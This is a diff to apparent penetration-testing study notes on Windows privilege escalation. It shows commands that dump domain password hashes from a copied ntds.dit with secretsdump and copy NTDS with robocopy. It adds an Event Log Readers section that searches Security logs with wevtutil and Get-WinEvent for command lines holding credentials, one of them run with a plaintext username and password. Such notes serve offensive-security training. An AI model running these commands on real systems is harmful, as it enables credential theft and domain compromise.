@@ -224,9 +224,27 @@ files we dumped to the attack box and run secretsdump
 ```
 impacket-secretsdump local -system SYSTEM -ntds ntds.dit
 ```
-Using Robocopy to transfer files
+## Using Robocopy to transfer files
 ```
 robocopy /B E:\Windows\NTDS .\ntds ntds.dit
 ```
+# Event Log Readers
+## Confirming Group Membership
+```
+net localgroup "Event Log Readers"
+```
+## Searching Security Logs using webtutil
+```
+wevtutil qe Security /rd:true /f:text | Select-String "/user"
+```
+## Passing Credientials to wevtutil
+```
+wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
+```
+## Searching Security Logs Using Get-WinEvent
+```
+Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+```
+The cmdlet can also be run as another user with the -Credential parameter.
 
 
